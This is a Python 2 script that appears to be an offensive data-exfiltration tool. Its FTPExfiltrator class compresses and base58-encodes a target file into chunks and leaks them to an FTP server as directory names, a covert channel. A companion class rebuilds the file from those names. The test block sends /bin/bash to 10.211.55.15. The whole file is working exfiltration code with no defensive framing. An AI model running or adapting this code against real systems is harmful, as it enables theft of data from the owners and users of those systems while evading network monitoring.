#!/usr/bin/python

import os
import sys
import zlib
import time
import base58
import base64
import socket
import hexdump

from ftplib import FTP
from ftplib import FTP_TLS

from operator import itemgetter


OKAY = 0
ERR = -1

DELIMITER = "-"
CHUNKS_SIZE = 127
SLEEP = 0.01


class GetContent():
	def __init__(self, dir="."):
		self.file_content = None
		self.dir = dir

	def get_file(self):
		self.decode_file()
		for i in self.file_content:
			if len(i.split(DELIMITER)) == 3:
				header = i.split(DELIMITER)
				file_name = header[1]
				crc = base58.b58decode(header[2].strip())
				crc = int(crc)

		# Create a sorted list by the integers.
		dd_list = []
		for chunk in self.file_content:
			try:
				a = chunk.split(DELIMITER)
				if int(a[0]) == 0:
					continue
				else:
					dd_list.append([int(a[0]), a[1]])
			except:
				sys.stderr.write("\t[-]\tError with chunk '%s'.\n" % chunk)
		dd_list = sorted(dd_list, key=itemgetter(0), reverse=False)

		raw_file = ""
		for chunk in dd_list:
			try:
				raw_file += base58.b58decode(chunk[1].strip())
				sys.stdout.write("\t[+]\tDecoded chunk %s.\n" % chunk[0])
			except:
				sys.stderr.write("\t[-]\tError with chunk '%s'.\n" % chunk[0])

		raw_file = zlib.decompress(raw_file)

		if zlib.crc32(raw_file, crc):
			sys.stdout.write("\t[+]\tCRC32 is matching in file %s.\n" % file_name)
			f = open(file_name, 'wb')
			f.write(raw_file)
			f.close()
		else:
			sys.stdout.write("\t[-]\tCRC32 is NOT matching in file %s.\n\t\tSaving anyway.\n" % file_name)
			f = open(file_name+"_badCRC", 'wb')
			f.write(raw_file)
			f.close()

	def decode_file(self):
		d = self.dir
		all_dirs = [os.path.join(d,o) for o in os.listdir(d) if os.path.isdir(os.path.join(d,o))]
		rel_dirs = []
		for i in all_dirs:
			rel_dirs.append(i[2:])
		sys.stdout.write("\t[+]\tTotal of %s relevant directories.\n" % len(rel_dirs))
		self.file_content = rel_dirs



class FTPExfiltrator():
	def __init__(self, file2exfil=None, server=None, port=21, creds=(), tls=False):
		"""
		Default init, get all variables and verify.
		"""
		self.file_chunks = None
		self.file_crc = None
		self.final_chunks = None

		if file2exfil is None:
			sys.stderr.write("There was no filename for exfiltration.\n")
			sys.exit(ERR)
		else:
			self.file_path = file2exfil
			self.file_name = str(file2exfil.split("/")[-1])

		if server is None:
			sys.stderr.write("There was no server for exfiltration.\n")
			sys.exit(ERR)
		else:
			self.server = server

		if creds == ():
			self.auth_flag = False
		else:
			self.auth_flag = True
			self.creds = creds

		if tls == False:
			self.tls_flag = False
		else:
			self.tls_flag = True

		self.port = port


	def get_file_chunks(self):
		"""
		The wrapper to get the file and the chunks.
		"""
		raw_content = self.get_file_content()
		if raw_content == ERR:
			return ERR
		self.file_chunks = self.split_file(raw_content)


	def split_file(self, raw_content):
		"""
		Splits the file into chunks
		"""

		# Compress raw file:
		raw_content = zlib.compress(raw_content, 9)

		a = list(raw_content[0+i:CHUNKS_SIZE+i] for i in range(0, len(raw_content), CHUNKS_SIZE))
		b = []
		for i in a:
			b.append(base58.b58encode(i))
		sys.stdout.write("\t[+]\tFile encoded with %s chunks.\n" % len(b))
		return b


	def get_file_content(self):
		"""
		Get the content of the file in an organized fashion.
		:param self: the class
		:return: File content or ERR
		"""
		try:
			f = open(self.file_path, 'rb')
		except IOError, err:
			# Error in a case where there is a FileRead error
			sys.stderr.write("Could not read file %s.\n%s\n" % (self.file_name, err))
			return ERR
		except:
			# General Error
			sys.stderr.write("Unknown error occured.\n")
			return ERR

		all_content = f.read()
		f.close()
		raw_crc = str(zlib.crc32(all_content))
		self.file_crc = base58.b58encode(raw_crc)
		sys.stdout.write("\t[+]\tRead file %s.\n" % self.file_name)
		return all_content

	def build_final_chunks(self):
		"""
		Builds the final chunks to be transmissted
		"""
		if self.file_chunks is None:
			return ERR

		final_chunks = []
		final_chunks.append("0" + DELIMITER + self.file_name + DELIMITER + self.file_crc)
		sys.stdout.write("\t[+]\tSending file name '%s' with CRC32 '%s'.\n" % (self.file_name, self.file_crc))
		chunk_id = 1
		for i in self.file_chunks:
			final_chunks.append( str(chunk_id) + DELIMITER + i )
			chunk_id += 1
		self.final_chunks = final_chunks


	def send_chunks(self):
		if self.final_chunks is None:
			return ERR

		if self.tls_flag:
			if self.auth_flag:
				ftp_obj = FTP_TLS(host=self.server, user=self.creds[0], passwd=self.creds[1])
			else:
				ftp_obj = FTP_TLS(host=self.server)
		else:
			if self.auth_flag:
				ftp_obj = FTP(host=self.server, user=self.creds[0], passwd=self.creds[1])
			else:
				ftp_obj = FTP(host=self.server)

		try:
			ftp_obj.login()
			sys.stdout.write("\t[+]\tConnected to server %s.\n" % self.server)
		except:
			sys.stderr.write("\t[-]\tCould not login to the server.\n")
			return ERR

		for chunk in self.final_chunks:
			ftp_obj.mkd(chunk)
			time.sleep(SLEEP)

		ftp_obj.quit()
		sys.stdout.write("\t[+]\tWrote %s(+1) folders.\n" % (len(self.final_chunks)-1))
		return OKAY


if __name__ == "__main__":
	# You are in the testing zone.
	testFlag = 1
	if testFlag == 0:
		FTPexf = FTPExfiltrator(server="10.211.55.15", file2exfil="/bin/bash")
		FTPexf.get_file_chunks()
		FTPexf.build_final_chunks()
		FTPexf.send_chunks()
	elif testFlag == 1:
		FTPHand = GetContent()
		FTPHand.get_file()
